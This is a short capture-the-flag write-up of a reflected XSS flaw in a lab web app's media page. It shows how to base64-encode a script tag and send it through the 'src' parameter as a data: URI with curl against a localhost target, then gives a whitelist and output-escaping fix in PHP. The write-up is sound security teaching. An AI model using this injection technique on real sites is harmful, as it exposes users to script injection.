# Reflected XSS via PHP wrapper

## 📖 Vulnerability Explanation
The media page loads a file using the _src_ parameter. The app doesn't sanitize the input and it makes a XSS possible by injecting HTML code with a ```data:/``` php wrapper.

## ⚙️ Exploitation Process
Encode the XSS payload and send it with the ```data:/text/html,base64;<base64 HTML code>``` wrapper. 

- Encode the payload in base64:

```
echo '<script> alert(42); </script>' | base64
```

- Send the encoded payload with curl, trigger XSS and get the flag:

```
curl -s 'http://localhost:9090/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD4gYWxlcnQoNDIpOyA8L3NjcmlwdD4K' | grep flag
```

## 🔧 Fix
To prevent from injections, the most secure and easy to implement fix is using a whitelist for the loadable sources.
In addition to this, it's also possible to sanitize the display to avoid XSS.

## ☝️🤓 Advanced explanation
The following code shows a secure implementation of file loading using a whitelist and protecting display:

```
<?php
$allowed_files = ['nsa', 'example', 'albatros'];
$src = $_GET['src'] ?? '';

if (in_array($src, $allowed_files, true)) {
    $content = file_get_contents($src);
    echo htmlspecialchars($content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
} else {
    echo "Invalid file request";
}
?>
```